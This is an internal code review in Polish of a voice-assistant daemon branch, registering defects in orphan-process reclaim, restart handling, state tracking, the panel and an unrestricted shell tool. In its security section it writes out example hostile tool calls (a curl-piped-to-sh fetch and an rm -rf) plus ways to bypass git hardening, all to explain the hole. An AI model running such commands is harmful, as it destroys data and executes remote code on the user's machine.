# Review 2026-07-21 — restart, reklamacja sieroty, shell_read

> **Status:** przegląd max-effort gałęzi `agent/dan-release1-integration`.
> Zakres: commit `9305568` (25 plików) + niezacommitowane zmiany drugiej sesji
> (`shell_read_unrestricted`, `personas.toml`).
> Dziesięć niezależnych kątów wyszukiwania; najcięższe zarzuty zweryfikowane
> ręcznie przez czytanie kodu i żywego procesu, nie na słowo agenta.
>
> **Co jest już naprawione** (każdy punkt oznaczony u siebie, nie tylko tutaj):
> §4 — walidacja typów w `[security]`, ZAMKNIĘTE. §18 — worktree usunięte,
> ZAMKNIĘTE. §2 — `shell_read` przestał opisywać się modelowi jako read-only
> (samo wykonanie nadal niebramkowane). §5 — token transportowy włączony, więc
> sekwencja `POST /settings` + restart wymaga dziś tokenu; sam rozjazd
> `writable`/`_VERSIONED_KEYS` zostaje.
>
> **Reszta stoi otwarta** i dokument jest ich rejestrem, nie raportem z fixów:
> w każdym pliku z potwierdzoną wadą stoi blok `KNOWN DEFECT` odsyłający do
> właściwego paragrafu, żeby czytający kod nie uwierzył opisowi obok defektu.
> Kolejność prac: sekcja „Co dalej" na końcu.
> Pliki opatrzone: `dan/daemon/supervisor.py`, `dan/daemon/restart.py`,
> `dan/daemon/app.py` (`mark_failed`), `dan/daemon/state_machine.py`,
> `dan/tools/shell_tool.py`, `dan/config.py`, `dan/voice/queue.py`,
> `dan/panel/assets/typewriter.js`.

## Legenda pewności

- **POTWIERDZONE** — sprawdziłem sam, czytając kod albo mierząc żywy runtime.
- **PRZEŚLEDZONE** — spójny mechanizm z konkretnymi `file:line`, ale bez mojego odczytu.

---

## 1. Reklamacja sieroty nigdy nie odpala w produkcji — POTWIERDZONE

`dan/daemon/supervisor.py:190`

```python
return shlex.split(command) == list(spec.argv)
```

`spec.argv` (`dan/daemon/app.py:1668-1677`) zaczyna się od samego binarium
supertonica — 8 tokenów. `ps -p <pid> -o ppid=,command=` na tej maszynie zwraca 9
tokenów, bo `~/.dan/venv/bin/supertonic` jest skryptem z shebangiem i jądro
wstawia ścieżkę interpretera na początek:

```
~/.homebrew/Cellar/python@3.14/.../Python.app/Contents/MacOS/Python \
  ~/.dan/venv/bin/supertonic serve --model supertonic-3 --port 7788 --log-level warning
```

Porównanie jest **zawsze** fałszywe → `_default_find_own_orphan` zwraca `None` →
`_reclaim_own_orphan_locked` zwraca `False` → po `launchctl kickstart -k` dand
dalej dostaje `ForeignPortOwnerError` i głos zostaje martwy. Fail-dead, który ta
zmiana i ADR-001 §"Ports" deklarują jako naprawiony, jest nietknięty.

Testy przechodzą, bo karmią `' '.join(SUPERTONIC_SPEC.argv)` albo wstrzykują
`orphan_probe` — czyli sprawdzają logikę na danych, których produkcja nigdy nie
wytworzy.

### ZDARZYŁO SIĘ NA ŻYWO — 2026-07-21, 20:51

To już nie jest wywód z kodu. Przy zwykłym `launchctl kickstart -k` (restart po
zmianie configu) demon **nie wstał**: dwadzieścia parę sekund `HTTP 000`, a w
`dand.err.log` dokładnie ta ścieżka — `ensure_running` → `_reject_foreign_owner_locked`
→ `ForeignPortOwnerError: supertonic: ... already answers but the server is not a
dand child`.

Zmierzony winowajca, PID 98336:

```
ppid=1   /Users/n1_ozzy/.homebrew/.../Python \
         /Users/n1_ozzy/.dan/venv/bin/supertonic serve --model supertonic-3 --port 7788 --log-level warning
```

Nasz venv, nasz model, nasz port, `ppid == 1` — czyli **własna sierota**, której
`_is_own_orphan` nie rozpoznał wyłącznie przez doklejony przez jądro interpreter.
Ręczny `SIGTERM` zwolnił port w sekundę i kolejny kickstart wstał normalnie.

Wniosek praktyczny dla operatora: **każdy restart dand-a może się tak skończyć**, a
objaw wygląda jak „demon padł", nie jak „port zajęty". Zanim zaczniesz debugować
start, sprawdź `lsof -nP -iTCP:7788 -sTCP:LISTEN` i porównaj argv z venvem — jeśli
to nasz supertonic z `ppid=1`, ubij go i wystartuj ponownie. To podnosi priorytet
naprawy argv (razem z dowodem własności, patrz pułapka niżej).

### PUŁAPKA W KOLEJNOŚCI NAPRAW

`_is_own_orphan` wymaga **obu** warunków: identyczne argv **i** `ppid == 1`.
Dopóki argv nigdy nie pasuje, nikt nikogo nie zabija. Naprawa porównania argv na
skróty (obcięcie interpretera, porównanie sufiksu) **natychmiast uzbraja**
pozostałe defekty:

- na macOS **każdy** proces startowany przez launchd ma `ppid == 1`, więc cudza
  usługa z tym samym argv zostanie uznana za naszą sierotę i ubita, a launchd ją
  wskrzesi → pętla kill/respawn i złamanie reguły ADR-001 „never kill someone
  else's process";
- `supervisor.py:719` woła `killpg` z PID-em zwróconym przez `lsof` (patrz §7).

**Argv i dowód własności trzeba naprawić razem, nie po kolei.**

---

## 2. `shell_read_unrestricted` = dowolny shell dla modelu — POTWIERDZONE

`dan/tools/shell_tool.py:132` — `ShellReadTool.run`, test allowlisty
(+ `dan/config.py:403`, `dan/daemon/app.py:2188`)

```python
if not self.unrestricted and normalized not in self.whitelist:
```

Allowlista była **jedyną** barierą:

- `dan/tools/permissions.py:142-157` — `ToolPermissionPolicy.decide()` zwraca
  `_allow()` bezwarunkowo dla każdego ryzyka i każdego źródła
  („Runtime-lab policy: tools run without approval gates");
- `dan/tools/shell_tool.py:158` (`run`) — `subprocess.run(..., shell=True)` bez żadnej
  sanityzacji metaznaków.

Przy `security.shell_read_unrestricted = true` model emitujący
`shell_read {"command": "curl -s http://x/p.sh | sh"}` albo `rm -rf ~/Documents/dev`
wykonuje to bez allowlisty, bez wiersza approval i bez gatingu po źródle.
Deklarowane w docstringu „approved-root containment" ogranicza **wyłącznie `cwd`** —
argv niesie własne ścieżki absolutne.

**Częściowo naprawione 2026-07-21:** narzędzie nie kłamie już modelowi o sobie.
Instancja z `unrestricted=True` podmienia `description` i opis pola `command` na
takie, które wprost mówią „NOT read-only" i „allowlist is OFF" (`ShellReadTool.__init__`,
testy `test_unrestricted_tells_the_model_it_is_not_read_only` i
`..._does_not_mutate_the_shared_class_schema`). To zamyka wprowadzanie mózgu w błąd,
**nie zamyka samej dziury** — wykonanie dalej jest niebramkowane, a `risk` dalej
raportuje `"shell_read"`. Zdejmowanie ryzyka wymagałoby ruszenia rejestru klas ryzyka
i ledgera testów, więc zostaje otwarte.

## 3. Utwardzenie gita omijalne po zdjęciu allowlisty — POTWIERDZONE

`dan/tools/shell_tool.py:151` (test `argv_check[0] == "git"` w `run`)

```python
if argv_check and argv_check[0] == "git":
```

Ten warunek był wyczerpujący **tylko** dlatego, że allowlista dopuszczała
skończony zbiór dosłownych stringów. Bez niej `/usr/bin/git status`,
`cd sub && git status`, `env git status`, `sh -c 'git status'` mają `argv[0]`
różne od `"git"` → `_GIT_ARGV_HARDENING` (`core.fsmonitor=`, `core.hooksPath=/dev/null`,
`protocol.ext.allow=never`) i `_GIT_ENV_HARDENING` nie są nakładane → wrogie repo
wykonuje własny program `core.fsmonitor`. To zdalne wykonanie kodu z narzędzia
opisanego jako read-only.

Nowy test `test_unrestricted_keeps_the_git_hardening` sprawdza wyłącznie dosłowne
`git status --short`, więc przechodzi mimo dziury.

## 4. Nowa flaga bez walidacji typu — ZAMKNIĘTE 2026-07-21

**Naprawione.** `_build_security_config` waliduje teraz każde pole zadeklarowane
jako `bool` w `SecurityConfig` — po adnotacji, nie po nazwie, więc następny
przełącznik jest objęty bez dotykania tej funkcji. Powtórzenie repro poniżej
daje dziś `ConfigError: security.shell_read_unrestricted must be a bool`.

Dwie rzeczy do zapamiętania: walidacja jest **fail-closed przy starcie**, więc
config z `= 0` zamiast `= false` (wcześniej cicho czytany jako fałsz) teraz
zatrzymuje demona — sprawdzone, że żywy `~/.dan/config.toml` przechodzi. I obejmuje
całą sekcję `[security]`, nie samą flagę shella.

Opis pierwotnej dziury zostaje niżej jako dowód, po co ta walidacja jest.

`dan/config.py` — `_build_security_config` filtrowało tylko klucze i nie
walidowało typów, inaczej niż `_build_memory_config` tuż niżej, które woła
`_require_config_bool`.

`shell_read_unrestricted = "false"` (typowa literówka w TOML) → string przechodzi
do frozen dataclassy bez `__post_init__` → `shell_tool.py:114` robi
`bool("false") == True` → demon startuje z **wyłączoną** allowlistą i nigdzie nie
zgłasza błędu. Fail-open na przełączniku bezpieczeństwa.

Zmierzone 2026-07-21 na tym kodzie:

```
>>> _build_security_config({"shell_read_unrestricted": "false"}).shell_read_unrestricted
'false'          # nie bool — string przeszedł
>>> bool('false')
True             # allowlista WYŁĄCZONA
```

`load_config` woła wprawdzie `validate_registered_config_tree` **przed**
`_build_security_config`, ale ta funkcja sprawdza wyłącznie, czy klucz jest
zarejestrowany („unregistered config key…"), nie rusza parserów i nie patrzy na
typy. Dziura jest więc **wyłącznie na ścieżce pliku TOML** — zapis przez API
przechodzi przez `_typed_parser`, który przy defaultcie `bool` odrzuca nie-boola
(`ConfigWriteRejected`). Naprawiać trzeba warstwę ładowania pliku, nie zapis.

## 5. Flaga zapisywalna przez HTTP — POTWIERDZONE

`security.shell_read_unrestricted` nie trafiła do `_VERSIONED_KEYS`, więc ląduje
w zapisywalnym koszyku INSTALLATION — w przeciwieństwie do sąsiednich
`require_approval_for_*`, celowo read-only. Decyduje o tym jedna linia
w `dan/config_registry.py`:

```python
writable=key in _LIVE_RUNTIME_KEYS or key not in _VERSIONED_KEYS | _OWNER_KEYS,
```

Zmierzone 2026-07-21 na żywym rejestrze:

```
security.shell_read_unrestricted   -> owner=installation  writable=True
security.require_approval_for_shell -> owner=versioned     writable=False
```

Czyli sześć sąsiednich przełączników approval jest celowo tylko do odczytu,
a ten jeden — nie. Przy `api_token_required = False` sekwencja
`POST /settings` + `POST /runtime/restart` uzbrajała dowolne wykonanie shella na
stałe, bez dotykania pliku konfiguracyjnego.

**Częściowo domknięte 2026-07-21:** `api_token_required` jest już `true`
(zmierzone na żywym demonie), więc ta sekwencja wymaga teraz tokenu i nie da się
jej odpalić ze strony w przeglądarce. **Sam rozjazd zostaje otwarty** — flaga
nadal jest `writable=True` i nadal brakuje jej w `_VERSIONED_KEYS`, w
przeciwieństwie do sześciu sąsiadek. Zamknięcie to dopisanie jej tam.

---

## 6. Restart: `exit 86` na fałszywej premisie — POTWIERDZONE

`dan/daemon/restart.py:121-133`

Gałąź „drain padł, ale containment kompletny → `os._exit(86)`" była napisana na
założeniu, że `stop()` zdążył zdemontować warstwę głosu. **To nieprawda.**
`DaemonApp.stop()` ma cztery miejsca rzucenia i **trzy z nich są przed**
`self.voice_broker = None` (`app.py:553`):

| miejsce | co rzuca | stan w chwili rzutu |
|---|---|---|
| `app.py:482` | `close_intake` → `DaemonLifecycleError` | wszystko żywe |
| `app.py:483` | `wait_for_drain` → `IntakeGateError` (`intake.py:142`) | wszystko żywe |
| `app.py:552` | `_quiesce_voice_broker` → `DaemonLifecycleError` (`app.py:1728/1734/1741`) | broker zatrzymywany, referencja zachowana |
| `app.py:568` / `:582` | po demontażu | premisa trzyma |

Najczęstsza awaria restartu to **timeout drenażu** — długa wypowiedź lub
generacja mózgu trzymająca lease dłużej niż `INTAKE_DRAIN_TIMEOUT_SECONDS`.
Po tej zmianie taki przypadek kończy się twardym `os._exit(86)` na w pełni żywym
demonie, w środku tury. Przed zmianą proces zostawał żywy i ponowienie restartu
po zwolnieniu lease by się udało.

## 7. `exit 86` osierocą procesy spoza supervisora — PRZEŚLEDZONE

`ChildContainmentResult` dowodzi śmierci **wyłącznie** dzieci `ChildSupervisora`
(supertonic). `os._exit(86)` przeskakuje resztę `stop()`:

- `app.py:585` `_stop_hotkey_monitor()` — nigdy nie wykonane;
- `app.py:590` `brain_manager.close()` — proces stream-json Claude'a startowany
  z `start_new_session=True` ma własną grupę procesów i przeżywa;
- rekorder `sox` startowany bez `start_new_session` też przeżywa → **gorący
  mikrofon** po wskrzeszeniu przez launchd;
- zdarzenie `daemon.stopped` nie jest dopisywane, bloki `finally` nie lecą,
  `logging.shutdown()` jest pomijany.

Efekt: drugi proces Claude'a i drugi `sox` na tym samym mikrofonie — dokładnie
podwójny właściciel, którego ADR-001 zakazuje.

## 8. `mark_failed` łyka własną awarię — POTWIERDZONE

`dan/daemon/app.py:664` — `except Exception: log(...)` bez zmiany stanu.
`snapshot_state()` wyprowadza `ok` z `state != ERROR` (`app.py:672`), więc gdy
zapis ERROR padnie (baza zablokowana/pełna — ta sama klasa awarii, która najpewniej
wywaliła drenaż), maszyna zostaje w IDLE i `/health` dalej ręczy za niemego demona.

Repozytorium ma już wzorzec na ten przypadek: `RuntimeStateMachine.force_idle`
(`state_machine.py:145-182`) przypisuje `self._state` **nawet gdy** append eventu
padnie. Brakuje siostrzanego `force_error`.

Dodatkowo guard `if machine.state is RuntimeState.ERROR: return` nie pokrywa
STOPPING — drugiego stanu bez wyjść (`state_machine.py:111-114`).

## 9. Stan ERROR nie jest trwały — POTWIERDZONE

`state_machine.py:57` — `_NORMAL_TRANSITIONS[ERROR] = {IDLE}`.

Wątki robocze są drenowane dopiero w `app.py:600`, więc przy zablokowanym
restarcie jeden może być w środku tury. `mark_failed` ustawia ERROR, tura się
kończy, orkiestrator woła `_return_to_idle` → `ok` wraca na `true`, podczas gdy
intake jest zamknięty, głos zdemontowany, a dzieci nadzorowane dalej żyją.

## 10. Panel ukrywa jedyny odczyt stanu runtime — PRZEŚLEDZONE

`dan/panel/assets/typewriter.js:143` + `:239` + `:292`

`hideChrome()` ustawia `display:none` na `#activityStrip` przy ładowaniu i
ponownie co 600 ms. To jedyny element renderujący stan runtime (`#stateLabel`,
`#activityStage`, `#activityTool`, `#activityStatus`, `#activityResult`) i jedyny
region `aria-live` w panelu. `app.js:7679-7685` wpisuje tam `ERROR` / `Runtime error`.

Czyli mechanizm z §8 zapala czerwone światło na elemencie, który ten sam commit
ukrywa. Zastępcza linia meta w `rewriteMeta` działa tylko przy żywym dymku DAN-a
(`typewriter.js:116`), a demon po nieudanym restarcie nie mówi → nic nie widać.

Łamie `AGENTS.md:15`: „Panel: render effective runtime state".

---

## 11. Regresja barge-in (FIX-09 z powrotem otwarty) — POTWIERDZONE (mechanizm)

`dan/voice/queue.py:361-371`

```python
queue_turn_ids = _unique_nonempty(session_id for _, session_id in rows)
...
tombstoned = self._tombstone_turns_in_transaction(generation_turn_ids)
```

`queue_turn_ids` jest wyliczane i **wyrzucane** — nagrobek dostają wyłącznie
`generation_turn_ids` z `GenerationRegistry`. Komentarz broni tego twierdzeniem,
że session id to „nazwy kanałów"; w rzeczywistości `session_id` to identyfikator
tury orkiestratora.

Luka otwiera się zawsze, gdy rejestr generacji jest pusty w chwili anulowania:

- adaptery `qwen`, `ollama`, `eco_brain`, `test` **nigdy** nie wołają `.register()`
  (robi to tylko `claude_cli_adapter.py`), a `brain.current_adapter` jest kluczem
  zapisywalnym przez API;
- **także domyślny adapter Claude'a** — w trakcie wykonywania narzędzia, gdy
  `unregister` już poszło.

Scenariusz: wchodzisz w słowo, gdy DAN komentuje przed tool-callem → wiersze lecą
na `cancelled`, tura nie dostaje nagrobka, narzędzie wraca, orkiestrator kolejkuje
odpowiedź pod tym samym turn id → DAN mówi to, co mu właśnie przerwałeś.

## 12. Skasowane testy polityki uprawnień — PRZEŚLEDZONE

Diff kasuje `tests/test_screen_read_policy.py`, `test_source_sensitive_policy.py`,
`test_ui_act_policy.py`, `test_ui_read_policy.py` (~328 linii). Po tym w `tests/`
nie ma **żadnej** asercji na `BLOCKED` ani `APPROVAL_REQUIRED` dla jakiejkolwiek
pary (risk, source), a `_blocked()` staje się kodem martwym.

Trzy pliki siostrzane przetrwały i dalej padają — pomiar agenta:
7 failed / 62 passed, w tym `test_ui_click_blocked_for_auto_sources`, gdzie
`ui_click` ze źródła `SCHEDULED_WORKER` faktycznie wykonuje kliknięcie.
`pyproject.toml` zmienia tylko `addopts` i niczego nie ignoruje, więc strata nie
jest zamaskowana.

> **MOJE WŁASNE ZDANIE STĄD BYŁO NIEAKTUALNE — wycofane 2026-07-21.**
> Pisałem tu, że „`docs/MACOS_PERMISSION_MODEL.md` dalej opisuje tę macierz jako
> egzekwowaną". Sprawdziłem plik ponownie: **nieprawda**. Ma dziś tytuł
> „(UNIMPLEMENTED DESIGN)", banner „⚠️ THE PERMISSION MODEL IN THIS DOCUMENT WAS
> NEVER BUILT", a w samej tabeli przypomnienie, że `decide()` zwraca ALLOW dla
> każdej komórki. Plik sam demaskuje poprzednią wersję bannera jako fałszywą.
> Zarzut trafiał w stan sprzed przepisania; utrzymywanie go byłby dokładnie tym
> błędem, który ten dokument wytyka innym.

> **W TRAKCIE NAPRAWY PRZEZ DRUGĄ SESJĘ (stan drzewa 2026-07-21, niezacommitowany).**
> `dan/tools/permissions.py`, `tests/test_tool_permissions.py`,
> `tests/test_effective_tool_policy.py` oraz ~45 plików w `docs/` są zmienione i
> nadal się zmieniają. Sprawdzone przeze mnie: **`decide()` zachowania nie
> zmieniło** — dalej zwraca `_allow(...)` bezwarunkowo dla każdej pary
> (ryzyko, źródło). Zmieniony jest docstring modułu, który teraz sam mówi
> „NOT an enforcement layer" i nazywa macierz z `MACOS_PERMISSION_MODEL.md`
> projektem niezaimplementowanym. Czyli druga sesja prostuje ten sam opis co ja,
> tylko od strony dokumentacji. Liczby o brakujących asercjach powyżej są sprzed
> tej zmiany i mogą być już nieaktualne — nie przepisywałem ich, bo cel jest
> ruchomy. **Nie edytować `docs/` ani `permissions.py` z tej sesji**, dopóki
> tamta nie skończy.

---

## 13. Supervisor: `killpg` z PID-em z `lsof` — PRZEŚLEDZONE

`supervisor.py:719` — `os.killpg` interpretuje pierwszy argument jako **grupę**.
Gdy sierota nie jest liderem swojej grupy, oba sygnały rzucają `ProcessLookupError`,
połknięty w `:720-721` → port nie zostaje zwolniony, a log twierdzi, że reklamacja
się udała. W drugą stronę: między `lsof` a sygnałem stoją dwa `subprocess.run`
z limitami 5 s; jeśli PID zostanie w tym czasie przydzielony ponownie liderowi
niepowiązanej grupy, `killpg(..., SIGKILL)` niszczy cudze drzewo procesów.

## 14. Supervisor: ~31 s snu pod lockiem na ścieżce startu — PRZEŚLEDZONE

`supervisor.py:733` — `_await_port_release` przechodzi cały spawn-owy backoff
`(0.5, 1.0, 2.0, 4.0, 8.0)` = 15,5 s, osobno po SIGTERM i po SIGKILL, trzymając
RLock supervisora branego w `ensure_running` (czyli w `DaemonApp.start()`) i w
`_restart_dead_child_locked`.

Sprzężenie: równoległy `POST /runtime/restart` wchodzi w `stop_all(timeout=5.0)`,
którego `acquire` wygasa (`supervisor.py:468`), zwraca `_incomplete_stop_result` →
`app.py:580` rzuca → exit zablokowany i `mark_failed` spycha **zdrowego** demona
do `RuntimeState.ERROR` tylko dlatego, że watchdog siedział w nowej ścieżce.

Harmonogram ponawiania spawnu to zły stały czas na „jądro zwolniło gniazdo"
(natychmiast). Właściwe: jedno okno ~1 s odpytywane co 50 ms.

---

## 15. Panel: zaszyta prędkość persony — POTWIERDZONE

`dan/panel/assets/typewriter.js:10` — `var perChar = 58 / 1.29;`

`CLAUDE.md:9`: „Voice/personas: canon IN THIS REPO — `config/voice/`
(`personas.toml` + `pronunciations.toml`); do NOT hardcode values."
`AGENTS.md:22` powtarza: „never copy values into docs".

Commit `9305568` zmienił `[dan] speed` z 1.29 na 1.32 i nie ruszył `typewriter.js:10`,
mimo że przepisał ten sam plik — panel tempował według prędkości, której runtime już
nie używał. Niezacommitowana zmiana cofa kanon do 1.29, co resynchronizuje obie
liczby **przypadkiem**. Prędkość powinna być czytana z demona.

## 16. Drobne — POTWIERDZONE

- `dan/panel/assets/index.html:505` — `<script src="./typewriter.js">` trzy razy
  w jednej linii. Dziś nieszkodliwe tylko dzięki guardowi
  `window.__danTypewriterLoaded` (`typewriter.js:2`); bez niego trzy zestawy
  `setInterval` (`pollEvents` 250 ms, `pollQueue`, painter 40 ms) i trzy painter-y
  na tym samym dymku.
- `dan/panel/assets/typewriter.js:128` — detektor zmiany porównuje string
  zawierający zegar sekundowy, więc „puls" odpala raz na sekundę na bezczynnym
  panelu i zostawia niesprzątane `setTimeout`.
- `dan/voice/queue.py:467` — po usunięciu flagi `tombstone_session`
  `cancel_superseded_request` jest identyczne z `cancel_request`.
- `dan/daemon/restart.py:141` — gałąź blokująca resetuje `_restarting`, ale
  zostawia stare `_operation_id`; kolejny `POST /runtime/restart` dostaje id
  poprzedniej, nieudanej operacji, bo `close_intake` widzi bramkę już zamkniętą.

---

## 17. Dokumentacja opisuje bramkę, której nie ma — audyt 2026-07-21

Osobny przebieg czytający (nie grep) po `dan/tools/permissions.py` i całym
`docs/`. Wzorzec jest jeden i powtarza się w kilkunastu plikach: **ADR-y i
runbooki opierają swoje gwarancje bezpieczeństwa na macierzy (ryzyko, źródło),
która nigdy nie została zbudowana.** Zdania typu „every `ui_act` request crosses
ApprovalGate", „unknown risk values are blocked", „`terminal_write` is
approval-for-everyone" opisują projekt, nie runtime.

Stan na dziś:

- **Trzy dokumenty mówią prawdę i są dobrym punktem wyjścia:**
  `MACOS_PERMISSION_MODEL.md` (cały oznaczony jako niezbudowany),
  `SECURITY_MODEL.md` §2 („Layer / What it does today"),
  `JARVIS_DO_NOT_TOUCH.md` („The tools are the containment, not the policy").
  Najdokładniejszym opisem stanu w całym repo jest docstring
  `dan/tools/permissions.py:1-25`.
- **Reszta jest w trakcie przepisywania przez drugą sesję** — nie wymieniam tu
  numerów linii, bo pliki zmieniają się w trakcie pisania tego akapitu
  (`DECISIONS.md` zmienił się na dysku między moim odczytem a moją edycją).
- **`docs/DECISIONS.md` ta fala ominęła**, więc poprawiłem go z tej sesji.
  Najgroźniejsze zdanie brzmiało: „a future gate re-enabling approval will
  require no code change — only `jarvis.toml` reversion" (ADR-022,
  Consequences). To nieprawda i to jest nieprawda kosztowna: ktoś przełączy
  klucze w configu, uwierzy, że ma ochronę, i jej nie będzie. `decide()` nie ma
  ani jednej instrukcji warunkowej. Dołożone: ramka korygująca pod ADR-022 i
  przypis pod tabelą Decision log (wiersze 010/017/018/021 obiecują bramkowanie).

Do zapamiętania na przyszłość: `MACOS_PERMISSION_MODEL.md` sam przyznaje, że
poprzednia wersja jego bannera „sent a debugging session down the wrong path".
Komentarz opisujący intencję zamiast implementacji jest gorszy niż brak
komentarza — kosztuje cudzą sesję, nie własną.

## 18. Rozsypane worktree — ZAMKNIĘTE 2026-07-21

**Usunięte na polecenie Ozzy'ego tego samego dnia.** `git worktree remove` na wpisie
w `.claude/` i `git worktree prune` na martwym — `git worktree list` pokazuje dziś
wyłącznie główny checkout. Gałęzie przeżyły usunięcie katalogów (worktree to katalog
roboczy, nie magazyn commitów), więc nawet gdyby pomiar poniżej się mylił, nic nie
przepadło. Opis zostaje jako dowód, po co ta zasada istnieje.

`git worktree list` pokazywał wtedy dwa wpisy poza głównym checkoutem:

| wpis | gałąź | stan |
|---|---|---|
| `~/Documents/dev/DAN-release1-wt` | `feat/dan-foundation-release1` | katalog **nie istnieje**, wpis `prunable` |
| `.claude/worktrees/voice-skills-dand-migration-521486` | `claude/voice-skills-dand-migration-521486` | 15 MB, drzewo czyste |

Zmierzone: **żadna z tych gałęzi nie ma commita spoza
`agent/dan-release1-integration`**, a worktree w `.claude/` nie ma zmian
niezacommitowanych. Czyli nic unikalnego tam nie leży.

Realna szkoda jest informacyjna: ten worktree trzyma **pełny, nieaktualny
duplikat `docs/`** sprzed korekt z 2026-07-21 — łącznie ze starą wersją
`SECURITY_MODEL.md`. Agent albo człowiek, który tam trafi, przeczyta
zdementowaną wersję modelu bezpieczeństwa jako obowiązującą. Każda poprawka
w `docs/` tę kopię omija.

Globalne `CLAUDE.md` zakazuje worktree wprost („scattered worktrees lose work
randomly", Ozzy 2026-07-13).

---

## Co dalej — kolejność

Zamknięte 2026-07-21, **nie zaczynaj od nich**: §4 (walidacja typów w
`[security]`), §18 (worktree usunięte), token transportowy włączony i zmierzony
(patrz wstawka w §5), a `shell_read` przestał opisywać się modelowi jako
read-only (wstawka w §2). Otwarte zostaje poniższe.

1. **§1 + §13 razem** — reklamacja sieroty. Awansowało na pierwsze miejsce, bo
   **zdarzyło się na produkcji 2026-07-21** (pomiar w §1), a nie tylko w kodzie:
   każdy restart dand-a może się skończyć demonem, który nie wstaje. Argv i dowód
   własności naprawiać jednym ruchem, nigdy osobno.
2. **§11 — barge-in.** Podniesione, bo to jedyna z otwartych wad, którą operator
   czuje codziennie: przerwany DAN po powrocie z narzędzia mówi to, co mu właśnie
   ucięto. FIX-09 jest z powrotem otwarty.
3. **§2, §3, §5 — reszta dziury shellowej.** Wykonanie jest nadal niebramkowane,
   `risk` nadal raportuje `"shell_read"`, matcher gita nadal łapie wyłącznie
   dosłowne `git`, a flaga nadal jest `writable=True` i brakuje jej w
   `_VERSIONED_KEYS`. Token utrudnił dosięgnięcie tego z zewnątrz, nie zamknął
   samego mechanizmu.
4. **§6–§9 — restart i widoczność awarii.** `exit 86` musi zależeć od tego, co
   `stop()` faktycznie zdemontował, a nie od containmentu dzieci; `mark_failed`
   potrzebuje `force_error` na wzór `force_idle` i odporności na powrót
   ERROR → IDLE.
5. **§10, §15 — panel.** Ukryty `#activityStrip` (czerwone światło, którego nikt
   nie zobaczy) i zaszyta w `typewriter.js` prędkość persony.
